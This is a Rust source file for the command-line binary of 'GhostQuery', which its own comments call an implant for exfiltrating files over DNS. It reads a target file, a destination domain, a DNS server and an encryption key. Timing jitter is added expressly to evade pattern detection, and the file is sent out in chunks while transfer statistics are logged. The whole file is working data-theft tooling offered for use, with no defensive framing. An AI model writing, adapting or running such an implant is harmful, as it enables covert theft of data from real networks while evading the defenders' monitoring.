//! GhostQuery Implant Binary
//!
//! The edge node (writer) that exfiltrates data via DNS.

use std::path::PathBuf;
use std::time::Duration;

use clap::Parser;
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};

use ghost_query::implant::{ImplantClient, ImplantConfig};

#[derive(Parser, Debug)]
#[command(name = "gq-implant")]
#[command(about = "GhostQuery Implant - DNS Exfiltration Client")]
#[command(version)]
struct Args {
    /// File to exfiltrate
    #[arg(short, long)]
    file: PathBuf,

    /// Target domain for exfiltration
    #[arg(short, long, default_value = "ghost.local")]
    domain: String,

    /// DNS server address (e.g., 8.8.8.8:53)
    #[arg(short, long)]
    server: Option<String>,

    /// Chunk size in bytes (larger = fewer queries, max 90)
    #[arg(long, default_value = "90")]
    chunk_size: usize,

    /// Window size (outstanding chunks, higher = more parallel)
    #[arg(long, default_value = "16")]
    window_size: usize,

    /// Base delay between queries in milliseconds
    #[arg(long, default_value = "40")]
    delay: u64,

    /// Jitter factor (0.0-1.0) for randomizing delays to evade pattern detection
    /// 0.5 means delays range from 50% to 150% of base delay
    #[arg(long, default_value = "0.5")]
    jitter: f64,

    /// Master key (hex encoded, 64 chars = 32 bytes)
    #[arg(short, long)]
    key: Option<String>,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    // Initialize logging
    let filter = if args.verbose { "debug" } else { "info" };
    tracing_subscriber::registry()
        .with(tracing_subscriber::fmt::layer())
        .with(tracing_subscriber::EnvFilter::new(filter))
        .init();

    tracing::info!("GhostQuery Implant starting...");
    tracing::info!("Target file: {:?}", args.file);
    tracing::info!("Domain: {}", args.domain);

    // Parse master key
    let master_key = if let Some(key_hex) = args.key {
        let bytes = hex::decode(&key_hex)?;
        if bytes.len() != 32 {
            anyhow::bail!("Master key must be 32 bytes (64 hex characters)");
        }
        let mut key = [0u8; 32];
        key.copy_from_slice(&bytes);
        key
    } else {
        // Generate random key
        let mut key = [0u8; 32];
        use rand::Rng;
        rand::thread_rng().fill(&mut key);
        tracing::warn!("Generated random master key: {}", hex::encode(key));
        tracing::warn!("Share this key with the controller!");
        key
    };

    // Parse DNS server
    let dns_server = if let Some(server) = args.server {
        Some(server.parse()?)
    } else {
        None
    };

    // Create config
    let config = ImplantConfig {
        domain: args.domain,
        chunk_size: args.chunk_size,
        window_size: args.window_size,
        query_delay: Duration::from_millis(args.delay),
        jitter: args.jitter,
        master_key,
        dns_server,
    };

    tracing::info!("Chunk size: {} bytes", args.chunk_size);
    tracing::info!("Base delay: {}ms with {:.0}% jitter", args.delay, args.jitter * 100.0);

    // Create client
    let client = ImplantClient::new(config);

    // Exfiltrate file
    tracing::info!("Starting exfiltration...");
    match client.exfiltrate_file(&args.file).await {
        Ok(()) => {
            let stats = client.stats();
            tracing::info!("Exfiltration complete!");
            tracing::info!("Chunks sent: {}", stats.chunks_sent);
            tracing::info!("Chunks acked: {}", stats.chunks_acked);
            tracing::info!("Retransmits: {}", stats.retransmits);
            tracing::info!("Bytes sent: {}", stats.bytes_sent);
            tracing::info!("Total queries: {}", stats.queries_made);
        }
        Err(e) => {
            tracing::error!("Exfiltration failed: {}", e);
            let stats = client.stats();
            tracing::info!("Stats at failure:");
            tracing::info!("  Chunks sent: {}", stats.chunks_sent);
            tracing::info!("  Errors: {}", stats.errors);
            return Err(e.into());
        }
    }

    Ok(())
}

